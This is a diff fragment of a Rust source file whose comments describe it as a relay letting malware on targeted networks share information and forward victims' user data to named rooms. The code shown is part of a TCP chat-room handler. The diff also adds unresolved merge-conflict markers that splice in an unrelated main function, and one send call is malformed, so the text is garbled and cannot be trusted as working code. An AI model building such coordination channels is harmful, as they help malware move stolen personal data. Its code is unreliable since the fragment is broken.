@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 //This will be used for connection among all the peers and will allow the malwares in the peer targetted networks to share the information among each other too.
 //The malware will send the info of the user and it will be sent to the room name on that basis only.
 
@@ -144,4 +145,10 @@ async fn handle_connection(tcp:TcpStream,tx:Sender<String>,names:Names,rooms:Roo
         room_tx.send("{} left the room: {}",name,room_name);
         names.remove(&name);
     }
+=======
+mod cmd;
+mod api;
+fn main(){
+    cmd::parse_cmdline_args()
+>>>>>>> parent of bf02cb4 (Fixes)
 }
